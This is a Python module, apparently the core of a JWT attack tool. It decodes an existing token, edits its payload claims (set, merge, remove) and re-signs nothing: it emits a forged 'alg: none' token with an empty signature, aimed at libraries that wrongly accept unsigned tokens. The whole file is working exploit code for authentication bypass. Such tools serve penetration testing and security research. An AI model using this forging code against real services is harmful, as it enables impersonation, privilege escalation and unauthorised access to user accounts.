"""Core JWT decoding and `alg: none` forging logic.

This module is intentionally dependency-free: it speaks raw base64url + JSON
so it can be vendored anywhere. The `alg: none` token shape it produces is:

    base64url(header) . base64url(payload) .

Note the trailing dot and empty signature segment — that is the canonical
representation required by most libraries that (incorrectly) accept
unsigned tokens.
"""

from __future__ import annotations

import base64
import binascii
import copy
import json
from typing import Any, Iterable


class JWTError(ValueError):
    """Raised when the input token cannot be parsed as a JWT."""


def b64url_decode(s: str | bytes) -> bytes:
    if isinstance(s, str):
        s = s.encode("ascii")
    pad = (-len(s)) % 4
    s = s + (b"=" * pad)
    try:
        return base64.urlsafe_b64decode(s)
    except (binascii.Error, ValueError) as e:
        raise JWTError(f"invalid base64url segment: {e}") from e


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _json_encode(obj: Any) -> bytes:
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Split and decode a JWT into (header, payload, raw_signature).

    Accepts `h.p.s`, `h.p.`, and `h.p` shapes. The signature is returned as
    the raw third segment (or empty string) — we never validate it.
    """
    if not isinstance(token, str):
        raise JWTError("token must be a string")
    token = token.strip()
    parts = token.split(".")
    if len(parts) == 2:
        parts.append("")
    if len(parts) != 3:
        raise JWTError(
            f"expected 2 or 3 dot-separated segments, got {len(parts)}"
        )

    header_b, payload_b, signature = parts

    try:
        header = json.loads(b64url_decode(header_b))
    except json.JSONDecodeError as e:
        raise JWTError(f"header is not valid JSON: {e}") from e
    try:
        payload = json.loads(b64url_decode(payload_b))
    except json.JSONDecodeError as e:
        raise JWTError(f"payload is not valid JSON: {e}") from e

    if not isinstance(header, dict):
        raise JWTError("header must decode to a JSON object")
    if not isinstance(payload, dict):
        raise JWTError("payload must decode to a JSON object")

    return header, payload, signature


def coerce_value(s: str) -> Any:
    """Best-effort coerce a CLI string into a JSON-native value.

    Tries JSON first (so `true`, `42`, `null`, `["a","b"]`, `{"k":1}` are
    parsed structurally) and falls back to the original string when that
    fails — this lets `--set name=alice` Just Work.
    """
    try:
        return json.loads(s)
    except (json.JSONDecodeError, ValueError):
        return s


def _split_dotted(path: str) -> list[str]:
    # Escape sequence: "\." to embed a literal dot in a key.
    out: list[str] = []
    buf: list[str] = []
    i = 0
    while i < len(path):
        c = path[i]
        if c == "\\" and i + 1 < len(path) and path[i + 1] == ".":
            buf.append(".")
            i += 2
            continue
        if c == ".":
            out.append("".join(buf))
            buf = []
        else:
            buf.append(c)
        i += 1
    out.append("".join(buf))
    return out


def set_dotted(obj: dict, path: str, value: Any) -> None:
    keys = _split_dotted(path)
    cur: Any = obj
    for k in keys[:-1]:
        if not isinstance(cur, dict):
            raise JWTError(
                f"cannot set '{path}': path traverses non-object at '{k}'"
            )
        if k not in cur or not isinstance(cur[k], dict):
            cur[k] = {}
        cur = cur[k]
    if not isinstance(cur, dict):
        raise JWTError(f"cannot set '{path}': leaf parent is not an object")
    cur[keys[-1]] = value


def del_dotted(obj: dict, path: str) -> bool:
    keys = _split_dotted(path)
    cur: Any = obj
    for k in keys[:-1]:
        if not isinstance(cur, dict) or k not in cur:
            return False
        cur = cur[k]
    if isinstance(cur, dict) and keys[-1] in cur:
        del cur[keys[-1]]
        return True
    return False


def _deep_merge(dst: dict, src: dict) -> dict:
    for k, v in src.items():
        if isinstance(v, dict) and isinstance(dst.get(k), dict):
            _deep_merge(dst[k], v)
        else:
            dst[k] = v
    return dst


def transform_payload(
    payload: dict,
    sets: Iterable[tuple[str, str]] | None = None,
    merge_json: dict | None = None,
    removes: Iterable[str] | None = None,
) -> dict:
    """Apply --set, --merge-json, --remove edits (in that order) to payload.

    Returns a new dict; the input is not mutated.
    """
    out = copy.deepcopy(payload)

    for key, raw in sets or ():
        set_dotted(out, key, coerce_value(raw))

    if merge_json:
        if not isinstance(merge_json, dict):
            raise JWTError("merge_json must decode to a JSON object")
        _deep_merge(out, merge_json)

    for key in removes or ():
        del_dotted(out, key)

    return out


def forge_none(
    token: str,
    sets: Iterable[tuple[str, str]] | None = None,
    merge_json: dict | None = None,
    removes: Iterable[str] | None = None,
    keep_header_extras: bool = False,
    trailing_dot: bool = True,
) -> tuple[dict, dict, str]:
    """Forge an `alg: none` JWT from an existing token.

    Returns (new_header, new_payload, new_token).
    """
    header, payload, _sig = decode_jwt(token)

    new_payload = transform_payload(
        payload, sets=sets, merge_json=merge_json, removes=removes
    )

    if keep_header_extras:
        new_header = {k: v for k, v in header.items() if k not in ("alg",)}
        new_header = {"alg": "none", **new_header}
        new_header.setdefault("typ", "JWT")
    else:
        new_header = {"alg": "none", "typ": "JWT"}

    h_seg = b64url_encode(_json_encode(new_header))
    p_seg = b64url_encode(_json_encode(new_payload))
    token_out = f"{h_seg}.{p_seg}." if trailing_dot else f"{h_seg}.{p_seg}"
    return new_header, new_payload, token_out
